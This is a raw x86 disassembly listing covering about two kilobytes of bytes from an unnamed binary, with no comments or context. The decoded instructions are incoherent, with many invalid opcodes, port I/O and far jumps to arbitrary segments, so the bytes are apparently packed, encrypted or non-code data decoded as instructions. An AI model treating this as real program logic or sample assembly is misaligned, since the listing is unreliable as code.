  4197b0:	bound  ebx,QWORD PTR [edi+ebp*1+0x6f293696]
  4197b7:	addr16 je 0x41974a
  4197ba:	hlt    
  4197bb:	inc    ebx
  4197bc:	(bad)  
  4197bd:	mov    ah,0x6f
  4197bf:	arpl   WORD PTR [ecx-0x2a7e370],bx
  4197c5:	xchg   edi,eax
  4197c6:	aam    0x91
  4197c8:	add    DWORD PTR [eax],0x1d7a1e78
  4197ce:	inc    esi
  4197cf:	xchg   BYTE PTR [eax-0x9ff10f6],bh
  4197d5:	data16 inc BYTE PTR [edx]
  4197d8:	cdq    
  4197d9:	jae    0x4197bd
  4197db:	mov    dl,0x37
  4197dd:	or     BYTE PTR [edi],ch
  4197df:	add    cl,BYTE PTR [ecx-0xa7f04b1]
  4197e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197e6:	cld    
  4197e7:	cld    
  4197e8:	or     DWORD PTR [edx+0x34a843ed],esi
  4197ee:	and    eax,0x1b2001d2
  4197f3:	lods   al,BYTE PTR ds:[esi]
  4197f4:	mov    eax,cs
  4197f6:	adc    edx,DWORD PTR [ecx+0x34ee1666]
  4197fc:	sti    
  4197fd:	(bad)  
  4197fe:	push   eax
  4197ff:	popf   
  419800:	popf   
  419801:	in     eax,dx
  419802:	xor    dh,cl
  419804:	xor    DWORD PTR ds:0xce3996ea,eax
  41980a:	out    0x62,eax
  41980c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41980d:	icebp  
  41980e:	lds    ecx,FWORD PTR [ebx+0x1eb3e971]
  419814:	xor    ebx,DWORD PTR [eax+0x4c]
  419817:	(bad)  
  419818:	sub    esi,esi
  41981a:	jno    0x419817
  41981c:	aas    
  41981d:	arpl   WORD PTR [esp+ebx*4-0x4a27167f],di
  419824:	ds lahf 
  419826:	jbe    0x41982d
  419828:	scas   al,BYTE PTR es:[edi]
  419829:	pusha  
  41982a:	aaa    
  41982b:	shl    eax,0x7a
  41982e:	xor    ebp,DWORD PTR [ecx-0x75bee9b1]
  419834:	stc    
  419835:	mov    DWORD PTR [eax-0x6f42e781],esi
  41983b:	clc    
  41983c:	cmp    al,0x74
  41983e:	(bad)  
  41983f:	cmp    bh,ch
  419841:	inc    edx
  419842:	sub    BYTE PTR [edi-0x7a],0x1a
  419846:	pop    ebx
  419847:	cmc    
  419848:	je     0x41980c
  41984a:	lods   al,BYTE PTR ds:[esi]
  41984b:	add    al,0x5c
  41984d:	(bad)  [esi]
  41984f:	loopne 0x4197e9
  419851:	mov    esp,0x38c44419
  419856:	mov    eax,0x80b29bd5
  41985b:	stc    
  41985c:	mov    dl,0xae
  41985e:	fwait
  41985f:	inc    ecx
  419860:	lods   eax,DWORD PTR ds:[esi]
  419861:	jge    0x41986f
  419863:	mov    edx,0x8fea3a5d
  419868:	pop    esi
  419869:	mov    esp,?
  41986b:	not    bl
  41986d:	mov    ah,BYTE PTR [ebx]
  41986f:	add    DWORD PTR ds:0x4982e16d,esi
  419875:	mov    ds:0x96d03dfe,al
  41987a:	dec    ecx
  41987b:	out    0x3a,eax
  41987d:	test   edx,eax
  41987f:	cs in  eax,dx
  419881:	mov    esp,DWORD PTR [eax]
  419883:	adc    al,0x93
  419885:	cs inc edx
  419887:	in     eax,dx
  419888:	mov    ch,0x5a
  41988a:	pop    edx
  41988b:	adc    DWORD PTR [edi],eax
  41988d:	pop    ss
  41988e:	jmp    0x9cc8:0x1de90e3d
  419895:	mov    ch,0xcf
  419897:	or     eax,0x5abde8a2
  41989c:	adc    al,0xb2
  41989e:	push   eax
  41989f:	out    0xa0,al
  4198a1:	and    ah,BYTE PTR [edx]
  4198a3:	popf   
  4198a4:	lods   eax,DWORD PTR ds:[esi]
  4198a5:	mov    ebp,0xc8927fee
  4198aa:	imul   ebx,DWORD PTR [edi+0x71],0xffffffbb
  4198ae:	inc    esi
  4198af:	lods   al,BYTE PTR ds:[esi]
  4198b0:	out    0xbc,eax
  4198b2:	mov    edx,0x356fc2dd
  4198b7:	fldcw  WORD PTR [edx-0x6f392af3]
  4198bd:	cmc    
  4198be:	es clc 
  4198c0:	mov    WORD PTR [edx+0x5f],?
  4198c3:	jnp    0x419887
  4198c5:	dec    ebp
  4198c6:	mov    ds:0x5c637396,al
  4198cb:	fcom   DWORD PTR [edi-0x19862d1c]
  4198d1:	jo     0x419860
  4198d3:	pop    ss
  4198d4:	add    cl,BYTE PTR [edi-0x13456175]
  4198da:	inc    edi
  4198db:	icebp  
  4198dc:	aas    
  4198dd:	and    al,0x30
  4198df:	adc    DWORD PTR [edi],ebp
  4198e1:	or     esi,ebp
  4198e3:	xchg   dl,bh
  4198e5:	shl    BYTE PTR [edi],cl
  4198e7:	jnp    0x41986e
  4198e9:	add    dh,BYTE PTR [edx]
  4198eb:	mov    fs,WORD PTR [edx-0x2b]
  4198ee:	push   0x14a38471
  4198f3:	out    0x30,al
  4198f5:	shl    BYTE PTR [edx+0x74],1
  4198f8:	stc    
  4198f9:	dec    esp
  4198fa:	enter  0xf41,0xc4
  4198fe:	cmp    cl,BYTE PTR [esi-0x83c55de]
  419904:	outs   dx,DWORD PTR ds:[esi]
  419905:	mov    edx,0x801f55f1
  41990a:	inc    edx
  41990b:	cld    
  41990c:	push   ebx
  41990d:	push   esi
  41990e:	popa   
  41990f:	out    dx,eax
  419910:	movntps XMMWORD PTR [eax],xmm4
  419913:	inc    esi
  419914:	jb     0x419937
  419916:	fsubp  st(7),st
  419918:	xchg   edx,eax
  419919:	cld    
  41991a:	add    al,0x98
  41991c:	adc    edx,0x6a
  41991f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419920:	ins    DWORD PTR es:[edi],dx
  419921:	cmp    DWORD PTR [esi-0x5],edx
  419924:	mov    dh,0xc
  419926:	sbb    DWORD PTR [edx],esi
  419928:	ffree  st(6)
  41992a:	or     edi,DWORD PTR [eax-0x5a]
  41992d:	xchg   ebp,eax
  41992e:	(bad)  
  41992f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419930:	(bad)  
  419931:	inc    edi
  419932:	sbb    ch,al
  419934:	rcr    DWORD PTR [ebx],1
  419936:	mov    bl,0x3
  419938:	fisubr WORD PTR [edx-0x48ef4ed]
  41993e:	xchg   esp,eax
  41993f:	mov    eax,0x8c6d273b
  419944:	iret   
  419945:	das    
  419946:	call   0x13a3:0xe214f9ba
  41994d:	mov    bh,0xcc
  41994f:	pushf  
  419950:	pop    edi
  419951:	test   BYTE PTR [ecx-0x1586e3d7],cl
  419957:	call   0x9117:0x4db062d0
  41995e:	mov    ah,BYTE PTR [ebx]
  419960:	test   BYTE PTR [si],dh
  419963:	mov    esi,0xa4e49a89
  419968:	outs   dx,DWORD PTR ds:[esi]
  419969:	shl    esp,1
  41996b:	jno    0x419975
  41996d:	jnp    0x419913
  41996f:	ficomp DWORD PTR [ebx-0x5e7418bc]
  419975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419976:	aad    0xf2
  419978:	adc    eax,DWORD PTR [esi+0x745c856]
  41997e:	add    al,BYTE PTR [edx-0x5ce34631]
  419984:	mov    eax,0xbda1db52
  419989:	add    DWORD PTR [esi+0xbd11e00],edx
  41998f:	clc    
  419990:	(bad)  
  419991:	jge    0x41995c
  419993:	retf   0xcb9d
  419996:	ret    
  419997:	push   cs
  419998:	xor    dh,al
  41999a:	inc    edx
  41999b:	rol    ah,0x4c
  41999e:	ins    DWORD PTR es:[edi],dx
  41999f:	loopne 0x419985
  4199a1:	jle    0x419959
  4199a3:	ins    DWORD PTR es:[edi],dx
  4199a4:	aaa    
  4199a5:	rol    BYTE PTR [ebp-0x30],0x7f
  4199a9:	pop    esi
  4199aa:	inc    eax
  4199ab:	ins    DWORD PTR es:[edi],dx
  4199ac:	js     0x419a08
  4199ae:	mov    BYTE PTR [ecx+ebx*2-0x2c05f593],dl
  4199b5:	dec    esp
  4199b6:	adc    cl,al
  4199b8:	mov    ch,0x5e
  4199ba:	imul   eax,DWORD PTR [edx+edi*4-0x58],0x4e37e7f6
  4199c2:	repnz lods eax,DWORD PTR ds:[esi]
  4199c4:	addr16 xor eax,0xe28b33ab
  4199ca:	or     eax,0xbadb1606
  4199cf:	je     0x41996d
  4199d1:	fst    QWORD PTR [edi-0x59fa0dc7]
  4199d7:	dec    eax
  4199d8:	mov    esp,0xc3925d7
  4199dd:	sub    ebx,DWORD PTR [eax]
  4199df:	pop    eax
  4199e0:	add    al,0x1
  4199e2:	xlat   BYTE PTR ds:[ebx]
  4199e3:	xor    ebp,edx
  4199e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199e6:	cmp    DWORD PTR [edx+0x7d],eax
  4199e9:	xchg   ebp,eax
  4199ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199eb:	ret    
  4199ec:	sar    edi,cl
  4199ee:	xor    DWORD PTR [edi-0x6a40824],esi
  4199f4:	mov    edi,0x2e338c11
  4199f9:	jl     0x4199ec
  4199fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199fc:	xchg   BYTE PTR [esi+0x59f8ea68],bh
  419a02:	jecxz  0x419a6a
  419a04:	je     0x419a20
  419a06:	lds    eax,FWORD PTR [ebx-0x31]
  419a09:	or     BYTE PTR [esi-0x18eb0e09],0x60
  419a10:	or     BYTE PTR [esi],al
  419a12:	stos   DWORD PTR es:[edi],eax
  419a13:	jns    0x419a0e
  419a15:	inc    ebx
  419a16:	shr    BYTE PTR [edi+0x1c],cl
  419a19:	jl     0x4199f0
  419a1b:	inc    esi
  419a1c:	cmp    BYTE PTR [eax+eiz*2-0x54ea243f],0xde
  419a24:	inc    esi
  419a25:	jmp    0x419a19
  419a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a28:	sub    edx,DWORD PTR [esi+0x7e]
  419a2b:	adc    al,0x62
  419a2d:	pusha  
  419a2e:	je     0x419a8d
  419a30:	data16 aas 
  419a32:	sbb    dh,BYTE PTR [ebp+0x4492fd5a]
  419a38:	pop    ecx
  419a39:	jae    0x419a1f
  419a3b:	enter  0x3688,0x51
  419a3f:	scas   eax,DWORD PTR es:[edi]
  419a40:	repz xlat BYTE PTR ds:[ebx]
  419a42:	out    dx,al
  419a43:	add    BYTE PTR [edx+0x11],0xeb
  419a47:	stos   DWORD PTR es:[edi],eax
  419a48:	pop    ds
  419a49:	mov    eax,ds:0xb84b62a6
  419a4e:	inc    ecx
  419a4f:	xor    eax,0x9a2ef2e1
  419a54:	mov    DWORD PTR [ebx+0x5a49bba5],0x6877a755
  419a5e:	jae    0x419a17
  419a60:	xchg   edx,eax
  419a61:	in     eax,dx
  419a62:	clc    
  419a63:	test   al,0x9b
  419a65:	adc    edx,DWORD PTR [edi+0x2c835727]
  419a6b:	arpl   sp,bx
  419a6d:	outs   dx,BYTE PTR ds:[esi]
  419a6e:	mov    dh,0xcf
  419a70:	xchg   ecx,eax
  419a71:	daa    
  419a72:	jmp    0x7be9:0xec8aa2ff
  419a79:	push   ecx
  419a7a:	mov    ah,0x8e
  419a7c:	push   0xd46b76d5
  419a81:	mov    eax,0x9c75031d
  419a86:	xchg   ch,dh
  419a88:	mov    eax,0xd3bc79cb
  419a8d:	pop    edx
  419a8e:	ins    BYTE PTR es:[edi],dx
  419a8f:	xchg   DWORD PTR ds:0xbe4faa77,ebp
  419a95:	push   es
  419a96:	in     eax,dx
  419a97:	and    dh,BYTE PTR [edi-0x251d99b]
  419a9d:	in     al,dx
  419a9e:	mov    bh,0x32
  419aa0:	pop    ss
  419aa1:	and    al,0x84
  419aa3:	aas    
  419aa4:	es sti 
  419aa6:	jno    0x419a6f
  419aa8:	out    0x32,eax
  419aaa:	stos   BYTE PTR es:[edi],al
  419aab:	mov    ds:0x32c9dad8,eax
  419ab0:	popf   
  419ab1:	jno    0x419b13
  419ab3:	aam    0x9b
  419ab5:	jge    0x419b13
  419ab7:	pop    edi
  419ab8:	(bad)  
  419ab9:	and    bl,ah
  419abb:	das    
  419abc:	cli    
  419abd:	mov    dl,0x8d
  419abf:	adc    al,0x21
  419ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ac2:	jbe    0x419afd
  419ac4:	cmp    al,0x99
  419ac6:	or     DWORD PTR [eax],0x69
  419ac9:	push   0x22dca5cb
  419ace:	fnsave [ebp+0x35ee9a56]
  419ad4:	scas   eax,DWORD PTR es:[edi]
  419ad5:	mov    WORD PTR [ebx],ss
  419ad7:	mov    ds:0xbad8843e,eax
  419adc:	ins    BYTE PTR es:[edi],dx
  419add:	(bad)
  419ae2:	outs   dx,DWORD PTR ds:[esi]
  419ae3:	les    ebp,FWORD PTR [ebx+0x4c90ac0d]
  419ae9:	call   0x80f9:0x43d1d209
  419af0:	aaa    
  419af1:	and    eax,0x723d2ab2
  419af6:	inc    ecx
  419af7:	push   ebp
  419af8:	jmp    0x6be5:0xc774adeb
  419aff:	call   0x6434:0x4b280124
  419b06:	xlat   BYTE PTR ds:[ebx]
  419b07:	mov    ebp,0x4045d0b
  419b0c:	inc    ecx
  419b0d:	imul   ebx,esi,0x4af09d10
  419b13:	dec    esp
  419b14:	icebp  
  419b15:	cld    
  419b16:	mov    ecx,0x2476b0b9
  419b1b:	mov    dh,0x18
  419b1d:	jge    0x419ac8
  419b1f:	mov    esp,0x6f9bbe60
  419b24:	ins    DWORD PTR es:[edi],dx
  419b25:	mov    WORD PTR [ecx+0x2806775c],gs
  419b2b:	add    ebx,DWORD PTR [edx-0x1b]
  419b2e:	xlat   BYTE PTR ds:[ebx]
  419b2f:	push   ebp
  419b30:	xchg   esi,eax
  419b31:	jnp    0x419ac6
  419b33:	inc    edx
  419b34:	arpl   WORD PTR ds:0x9dfce9f3,si
  419b3a:	cli    
  419b3b:	sbb    eax,0x7c9d4c18
  419b40:	xor    DWORD PTR [ebp-0x55],esp
  419b43:	inc    DWORD PTR [eax+0x31fe3955]
  419b49:	pop    ds
  419b4a:	js     0x419ae5
  419b4c:	dec    esi
  419b4d:	lods   al,BYTE PTR ds:[esi]
  419b4e:	shr    DWORD PTR [ebp+esi*4+0x58],1
  419b52:	mov    edi,DWORD PTR [esi+0x7aacabf4]
  419b58:	and    ecx,edx
  419b5a:	inc    ebx
  419b5b:	push   ds
  419b5c:	xchg   ecx,eax
  419b5d:	mov    ebx,0xdfa8a4f
  419b62:	shl    DWORD PTR [edx],1
  419b64:	xchg   ebp,eax
  419b65:	add    eax,0x58dd9cd
  419b6a:	loope  0x419bb6
  419b6c:	stos   DWORD PTR es:[edi],eax
  419b6d:	xchg   ebp,eax
  419b6e:	fisttp QWORD PTR [ebx+0x66725497]
  419b74:	jnp    0x419bf0
  419b76:	sub    esi,DWORD PTR [edx-0x16ecbc8e]
  419b7c:	popf   
  419b7d:	(bad)  
  419b7e:	push   ds
  419b7f:	jmp    0xc61e62a6
  419b84:	pop    ecx
  419b85:	dec    eax
  419b86:	ror    BYTE PTR [esi+0xb0aea88],1
  419b8c:	mov    cl,al
  419b8e:	mov    ebx,eax
  419b90:	test   eax,0xb332d95a
  419b95:	fcmovnu st,st(2)
  419b97:	daa    
  419b98:	jl     0x419bc7
  419b9a:	sbb    DWORD PTR [edi+ebx*8],esi
  419b9d:	jno    0x419bed
  419b9f:	push   ebp
  419ba0:	xor    esp,DWORD PTR [ecx+eiz*4]
  419ba3:	mov    eax,ds:0x1726dfb6
  419ba8:	jp     0x419bed
  419baa:	cmp    ecx,eax
  419bac:	sbb    DWORD PTR [edx-0x45],ebp
  419baf:	ds inc esi
  419bb1:	adc    ebp,DWORD PTR [eax]
  419bb3:	inc    ebp
  419bb4:	adc    al,0xa9
  419bb6:	mov    ds:0xb6a81dad,al
  419bbb:	mov    ch,0x9b
  419bbd:	lods   al,BYTE PTR ds:[esi]
  419bbe:	jmp    0x419b68
  419bc0:	test   eax,0xeec3e98
  419bc5:	push   ecx
  419bc6:	loopne 0x419bb8
  419bc8:	push   eax
  419bc9:	std    
  419bca:	push   0xdcdba5a9
  419bcf:	popf   
  419bd0:	push   eax
  419bd1:	or     BYTE PTR [ebp+ebx*4+0x666dee7a],bl
  419bd8:	dec    eax
  419bd9:	mov    al,0x1d
  419bdb:	xor    eax,DWORD PTR [ebx+0x7d9996fa]
  419be1:	and    al,0xed
  419be3:	adc    al,0x1a
  419be5:	je     0x419c4c
  419be7:	inc    edx
  419be8:	ficom  WORD PTR [eax+0x69]
  419beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bec:	jg     0x419b8d
  419bee:	retf   0xaecc
  419bf1:	adc    al,0xb5
  419bf3:	sar    ah,cl
  419bf5:	aad    0xef
  419bf7:	rcr    DWORD PTR [edi-0x32],0x78
  419bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bfc:	fst    QWORD PTR [ebp-0x2989b8cf]
  419c02:	jne    0x419bd3
  419c04:	sbb    eax,0xbc484bde
  419c09:	scas   eax,DWORD PTR es:[edi]
  419c0a:	xlat   BYTE PTR ds:[ebx]
  419c0b:	dec    eax
  419c0c:	mov    ebx,edx
  419c0e:	pop    ds
  419c0f:	out    dx,al
  419c10:	dec    esi
  419c11:	das    
  419c12:	scas   al,BYTE PTR es:[edi]
  419c13:	dec    esi
  419c14:	sbb    DWORD PTR [edx-0x149e6c55],eax
  419c1a:	mov    eax,ds:0x372b29dd
  419c1f:	sar    BYTE PTR [edi-0x3332060],0xa6
  419c26:	push   ebx
  419c27:	adc    bl,0xd0
  419c2a:	add    ebx,ebx
  419c2c:	add    DWORD PTR [ecx-0x57055b1e],ecx
  419c32:	mov    edi,ebp
  419c34:	mov    bl,0x39
  419c36:	sbb    al,0x6
  419c38:	or     BYTE PTR [esi+0x8d4a377],dh
  419c3e:	dec    esi
  419c3f:	and    ebx,DWORD PTR [edx]
  419c41:	cwde   
  419c42:	repz popa 
  419c44:	shl    edx,0x18
  419c47:	mov    bh,0x63
  419c49:	mov    esi,0xc92bde20
  419c4e:	shr    DWORD PTR [edi-0x3f771c7a],1
  419c54:	xor    eax,0x87fbc7cc
  419c59:	adc    esi,DWORD PTR [ecx+esi*4-0x2a]
  419c5d:	sbb    DWORD PTR [ecx+edx*1-0x3677f743],edi
  419c64:	in     al,0x63
  419c66:	xor    DWORD PTR [esp+eiz*4+0x30a3ec4c],ebp
  419c6d:	xchg   esi,eax
  419c6e:	jg     0x419c4e
  419c70:	adc    esi,0xffffffd2
  419c73:	icebp  
  419c74:	mov    al,0x80
  419c77:	inc    esp
  419c78:	mov    ch,0xc0
  419c7a:	jb     0x419c82
  419c7c:	xchg   ecx,eax
  419c7d:	rcr    BYTE PTR [esi],0x47
  419c80:	test   eax,0x2c97b86a
  419c85:	shl    BYTE PTR [edi+0x5357d5b7],cl
  419c8b:	mov    WORD PTR [edi],ss
  419c8d:	cmc    
  419c8e:	enter  0xef7c,0xb0
  419c92:	stos   DWORD PTR es:[edi],eax
  419c93:	(bad)  
  419c94:	add    BYTE PTR [ebx-0x45e6c619],dl
  419c9a:	fucomi st,st(1)
  419c9c:	xor    bl,BYTE PTR fs:[eax]
  419c9f:	xchg   BYTE PTR [ebx],al
  419ca1:	add    ch,BYTE PTR [ebp+ebp*1+0x7d]
  419ca5:	frstor [ecx+0x20d17bdb]
  419cab:	adc    esp,edi
  419cad:	add    BYTE PTR [esi-0x80],dh
  419cb0:	push   ebx
  419cb1:	xlat   BYTE PTR ds:[ebx]
  419cb2:	arpl   WORD PTR [eax-0x6f],bp
  419cb5:	ds xchg edi,esp
  419cb8:	stos   DWORD PTR es:[edi],eax
  419cb9:	mov    ch,0xa8
  419cbb:	sub    DWORD PTR ds:0x168d6946,0xac7de0f7
  419cc5:	repnz aam 0xc
  419cc8:	and    eax,0xdf8e4085
  419ccd:	xchg   ah,dh
  419ccf:	push   es
  419cd0:	add    DWORD PTR [edx],0xffffffe6
  419cd3:	or     eax,0x9585149a
  419cd8:	push   esi
  419cd9:	push   ebp
  419cda:	in     eax,dx
  419cdb:	repz push edi
  419cdd:	lds    esp,FWORD PTR [edi]
  419cdf:	push   0xdfe8aa4d
  419ce4:	stos   DWORD PTR es:[edi],eax
  419ce5:	arpl   bx,sp
  419ce7:	into   
  419ce8:	les    edi,FWORD PTR ds:0x511b4cad
  419cee:	daa    
  419cef:	outs   dx,DWORD PTR ds:[esi]
  419cf0:	mov    DWORD PTR [edi+0x242b38ed],ecx
  419cf6:	clc    
  419cf7:	pop    ds
  419cf8:	aam    0xf7
  419cfa:	mov    edi,DWORD PTR [edx+0x64]
  419cfd:	push   ds
  419cfe:	lahf   
  419cff:	test   al,0x91
  419d01:	sti    
  419d02:	fcmovb st,st(1)
  419d04:	pop    esp
  419d05:	pop    eax
  419d06:	(bad)  
  419d07:	cmp    eax,0xb01bc5e9
  419d0c:	in     eax,dx
  419d0d:	xor    al,0xcb
  419d0f:	and    BYTE PTR [ebx+0x4],bh
  419d12:	pop    ds
  419d13:	sub    eax,0x3e472809
  419d18:	cmp    DWORD PTR [edi+0x69b4cd8f],eax
  419d1e:	adc    al,0x44
  419d20:	and    eax,0x5267ada8
  419d25:	mov    bh,0xc7
  419d27:	jno    0x419d00
  419d29:	jle    0x419d62
  419d2b:	mov    dh,BYTE PTR [ecx+0x9]
  419d2e:	and    dl,BYTE PTR [ebp-0x51fb2645]
  419d34:	pop    edx
  419d35:	mov    dh,0xf7
  419d37:	xchg   edx,eax
  419d38:	fwait
  419d39:	or     BYTE PTR [edx],al
  419d3b:	sbb    eax,0x35dba89c
  419d40:	cs nop
  419d42:	cmp    BYTE PTR [ebx+0x41],bl
  419d45:	xchg   edx,eax
  419d46:	jo     0x419d39
  419d48:	mov    al,0xb1
  419d4a:	int    0x97
  419d4c:	adc    BYTE PTR [ebx],0x3c
  419d4f:	adc    ecx,eax
  419d51:	jp     0x419ce2
  419d53:	jmp    0x419da3
  419d55:	leave  
  419d56:	sub    eax,0x24c4c5ce
  419d5b:	push   edx
  419d5c:	fs mov edx,0x3ac5f9a4
  419d62:	xchg   edi,eax
  419d63:	call   0x3686b84f
  419d68:	gs inc ecx
  419d6a:	pushf  
  419d6b:	xchg   eax,esp
  419d6d:	lock dec esp
  419d6f:	jo     0x419db9
  419d71:	mov    dh,0x9c
  419d73:	sbb    al,0x89
  419d75:	push   edx
  419d76:	inc    esp
  419d77:	jnp    0x419d36
  419d79:	loop   0x419d67
  419d7b:	stos   BYTE PTR es:[edi],al
  419d7c:	lods   eax,DWORD PTR ds:[esi]
  419d7d:	cmp    BYTE PTR [eax+ebx*4+0x49fd9b89],bh
  419d84:	adc    al,0x9b
  419d86:	sahf   
  419d87:	add    BYTE PTR ds:0x49520c80,0x9f
  419d8e:	cmp    BYTE PTR [ecx+0x4222bfab],ch
  419d94:	and    bl,bh
  419d96:	mov    dh,0x8c
  419d98:	xchg   ecx,eax
  419d99:	xlat   BYTE PTR ds:[ebx]
  419d9a:	into   
  419d9b:	and    esp,edx
  419d9d:	cs xor al,0x33
  419da0:	pop    eax
  419da1:	dec    ebp
  419da2:	mov    al,0xf2
  419da4:	jbe    0x419e05
  419da6:	outs   dx,DWORD PTR ds:[esi]
  419da7:	cmp    al,0x10
  419da9:	mov    ds:0x134aceec,al
  419dae:	pop    ss
  419daf:	sub    esp,DWORD PTR [edx+0x490ce889]
  419db5:	jmp    0x93454110
  419dba:	pop    esp
  419dbb:	sub    dl,BYTE PTR [ebp-0x6bc2c497]
  419dc1:	jmp    0x419dc5
  419dc3:	push   ecx
  419dc4:	shl    DWORD PTR [ebp-0x7c],1
  419dc7:	lods   eax,DWORD PTR es:[esi]
  419dc9:	mov    esp,DWORD PTR [edx-0x5b]
  419dcc:	sub    cl,cl
  419dce:	dec    edi
  419dcf:	repz pop ss
  419dd1:	xchg   esi,eax
  419dd2:	fisttp DWORD PTR [ebx]
  419dd4:	out    dx,al
  419dd5:	sbb    ah,BYTE PTR [eax-0x2d43c9db]
  419ddb:	xchg   edx,eax
  419ddc:	push   esi
  419ddd:	or     esp,DWORD PTR [eax+eiz*8+0x5dc89b3b]
  419de4:	fwait
  419de5:	jb     0x419dcd
  419de7:	xor    eax,0x9f9deac0
  419ded:	sbb    bl,bh
  419def:	in     al,dx
  419df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419df1:	inc    esi
  419df2:	rol    DWORD PTR [ebx-0x54],1
  419df5:	push   0x1f
  419df7:	mov    ds:0x79d964cf,eax
  419dfc:	push   ds
  419dfd:	dec    esp
  419dfe:	jns    0x419e21
  419e00:	sbb    BYTE PTR [ecx+ebp*8-0x72],ah
  419e04:	sub    cl,BYTE PTR [ecx-0x4b]
  419e07:	imul   edx,DWORD PTR ds:0x8334c22c,0xc2c7915b
  419e11:	sub    eax,edi
  419e13:	(bad)  
  419e14:	rol    eax,1
  419e16:	pop    es
  419e17:	paddw  mm6,QWORD PTR [edx+0x79]
  419e1b:	pushf  
  419e1c:	and    al,0x49
  419e1e:	push   ss
  419e1f:	pop    ds
  419e20:	xor    BYTE PTR [ebx-0x1c],0xd9
  419e24:	jo     0x419db8
  419e26:	fadd   QWORD PTR [esi]
  419e28:	ds out dx,eax
  419e2a:	in     al,dx
  419e2b:	fcom   QWORD PTR ds:0x31582966
  419e31:	xor    esi,esi
  419e33:	popf   
  419e34:	inc    eax
  419e35:	or     bh,BYTE PTR [ebp-0x110220f1]
  419e3b:	fsubr  DWORD PTR [ebx-0x1b6c7f86]
  419e41:	or     ebp,0xffffffd7
  419e44:	imul   eax,eax,0xffffff81
  419e47:	sub    ah,BYTE PTR [ebx]
  419e49:	and    dh,BYTE PTR [ecx+0x45c55f9a]
  419e4f:	fnsave [edx-0x594c4c72]
  419e55:	mov    eax,ds:0x67c73623
  419e5a:	in     al,dx
  419e5b:	imul   edx,DWORD PTR [ecx],0x6caaf82d
  419e61:	jle    0x419e70
  419e63:	jb     0x419ed2
  419e65:	retf   
  419e66:	mov    BYTE PTR [edx+edx*1],ch
  419e69:	dec    ecx
  419e6a:	dec    esp
  419e6b:	mov    eax,ds:0xa91e57d6
  419e70:	xchg   edi,eax
  419e71:	dec    esi
  419e72:	mov    esi,DWORD PTR [edx-0x2f]
  419e75:	pop    ebx
  419e76:	mov    ds:0x637557ae,eax
  419e7b:	lahf   
  419e7c:	mov    eax,ds:0x8d7e054f
  419e81:	sub    al,0x13
  419e83:	cmp    edx,DWORD PTR [edi+0xd]
  419e86:	shl    DWORD PTR ds:0x52278f68,1
  419e8c:	or     BYTE PTR [edi+0x77b3fcf4],ah
  419e92:	sbb    cl,BYTE PTR [edx-0x1a]
  419e95:	adc    al,0xb9
  419e97:	cli    
  419e98:	pop    ebx
  419e99:	sub    BYTE PTR [eax+0xb794210],ah
  419e9f:	cwde   
  419ea0:	cmp    DWORD PTR [ebx-0x29aca349],edx
  419ea6:	ins    DWORD PTR es:[edi],dx
  419ea7:	dec    ecx
  419ea8:	fwait
  419ea9:	ja     0x419ed9
  419eab:	(bad)  
  419eac:	sbb    dl,BYTE PTR [esi]
  419eae:	xor    al,0xe3
  419eb0:	cmp    ch,BYTE PTR [ecx*4-0x31407c7d]
  419eb7:	sahf   
  419eb8:	in     al,0x7f
  419eba:	push   edx
  419ebb:	push   ecx
  419ebc:	out    0x5e,al
  419ebe:	sub    DWORD PTR [edx],edi
  419ec0:	aaa    
  419ec1:	xchg   DWORD PTR [ebp+0x5b],eax
  419ec4:	jmp    0x162d:0x192a6fb8
  419ecb:	cmp    BYTE PTR [eax-0x9],cl
  419ece:	push   edx
  419ecf:	and    cl,BYTE PTR [edi+0x79f74f06]
  419ed5:	stc    
  419ed6:	jnp    0x419e99
  419ed8:	add    BYTE PTR [ecx-0x57318cbd],cl
  419ede:	inc    edi
  419edf:	mov    ebx,ebp
  419ee1:	lods   al,BYTE PTR ds:[esi]
  419ee2:	mov    ebp,0xad32143b
  419ee7:	ja     0x419ee9
  419ee9:	mov    ds:0xdec3d37b,eax
  419eee:	xor    DWORD PTR [eax+0x71f2d19c],0x720e883e
  419ef8:	sar    DWORD PTR [ebx+0x4b],cl
  419efb:	push   ebx
  419efc:	inc    eax
  419efd:	push   DWORD PTR [edx-0x65082b05]
  419f03:	out    0x95,eax
  419f05:	or     edx,esi
  419f07:	int    0x1a
  419f09:	icebp  
  419f0a:	sar    BYTE PTR ds:0xfd04322e,0xf8
  419f11:	fmul   QWORD PTR [edx]
  419f13:	ss inc esp
  419f15:	fbld   TBYTE PTR [eax+0x67]
  419f18:	mov    WORD PTR [edi-0x1c],fs
  419f1b:	stos   DWORD PTR es:[edi],eax
  419f1c:	jmp    0xa123:0xf276e786
  419f23:	cdq    
  419f24:	mov    gs,WORD PTR [esi]
  419f26:	xor    eax,0xd18c9f94
  419f2b:	(bad)  
  419f2c:	push   ebx
  419f2d:	cmc    
  419f2e:	stc    
  419f2f:	and    dl,0x6d
  419f32:	js     0x419ee8
  419f34:	arpl   WORD PTR [edi-0x3d],si
  419f37:	mov    dh,0xfd
  419f39:	xor    DWORD PTR [esi-0x5766e352],0x6e
  419f40:	imul   ebx,DWORD PTR [ebx+0x4c7e869],0xc967c402
  419f4a:	xchg   esp,eax
  419f4b:	cmp    eax,eax
  419f4d:	mov    dh,0x38
  419f4f:	in     eax,0x85
  419f51:	adc    eax,0xb60d73ed
  419f56:	rcr    ebp,0x9
  419f59:	jne    0x419fc5
  419f5b:	pop    es
  419f5c:	mov    cl,0x67
  419f5e:	stos   DWORD PTR es:[edi],eax
  419f5f:	xchg   ebp,eax
  419f60:	stc    
  419f61:	xchg   DWORD PTR [ecx+ecx*1-0x564a5114],edi
  419f68:	rcl    DWORD PTR [ebp+0x3aa6e2f6],1
  419f6e:	popa   
  419f6f:	mov    ds:0xd529a861,al
